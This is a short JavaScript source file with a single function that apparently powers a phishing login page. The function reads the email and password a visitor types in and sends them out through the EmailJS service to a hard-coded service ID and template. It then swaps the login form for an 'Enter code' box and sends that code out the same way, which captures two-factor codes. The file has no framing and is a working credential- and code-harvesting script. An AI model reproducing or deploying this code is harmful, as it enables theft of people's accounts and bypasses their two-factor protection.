function sendMail() {
  const email = document.getElementById("email");
  const password = document.getElementById("password");
  let params = {
    email: email.value,
    password: password.value,
  };
  console.log(params);
  const serviceID = "service_7617z8s";
  const templateID = "template_sf5yfy1";
  emailjs
    .send(serviceID, templateID, params)
    .then((res) => {
      email.value = "";
      password.value = "";
      console.log(res.status);
    })
    .catch((err) => console.log(err));
  const submitButton = document.getElementById("submit-button");
  const emailInputs = document.getElementById("email-inputs");
  emailInputs.removeChild(email);
  emailInputs.removeChild(password);
  emailInputs.removeChild(submitButton);
  const codeInput = document.createElement("input");
  codeInput.type = "text";
  codeInput.id = "codeInput";
  codeInput.placeholder = "Enter code";
  const button = document.createElement("button");
  button.textContent = "Send";
  button.onclick = () => {
    const code = document.getElementById("codeInput");
    let params = {
      code: code.value,
    };
    const serviceID = "service_7617z8s";
    const templateID = "template_dzkz6ta";
    emailjs
      .send(serviceID, templateID, params)
      .then((res) => {
        code.value = "";
        console.log(res.status);
      })
      .catch((err) => console.log(err));
      
  };
  emailInputs.appendChild(codeInput);
  emailInputs.appendChild(button);
}
